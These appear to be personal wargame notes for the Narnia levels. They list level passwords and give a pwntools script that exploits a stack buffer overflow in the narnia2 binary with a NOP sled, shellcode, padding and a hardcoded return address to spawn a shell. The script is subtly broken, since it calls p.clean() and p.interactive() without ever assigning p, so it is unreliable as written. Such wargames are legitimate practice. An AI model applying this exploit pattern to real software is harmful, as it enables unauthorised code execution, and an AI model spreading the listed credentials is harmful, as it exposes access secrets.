- lvl 0 : WDcYUTG5ul (ez buffer overflow)
- lvl 1 : 5agRAXeBdG (inject shell code in env variable (use '/bin/bash' - p )) 
- lvl 2 : padding : 132
```python
from pwn import * 
context.binary = ELF('./narnia2') #for the shellcode to be correct we need to set the context.binary 
 #the process is known from the context
payload = b"\x90"*50 + asm(shellcraft.sh()) # Nop instructions + the shellcode
payload = payload.ljust(132,b'A') #adjust the payload to reach the return address using the padding found
payload += p32(0xffffd308)  # address of the shellcode (or nop instructions) , use p64 if u re working on 64-bit system
process(['./narnia2', payload])
log.info(p.clean())

p.interactive()
```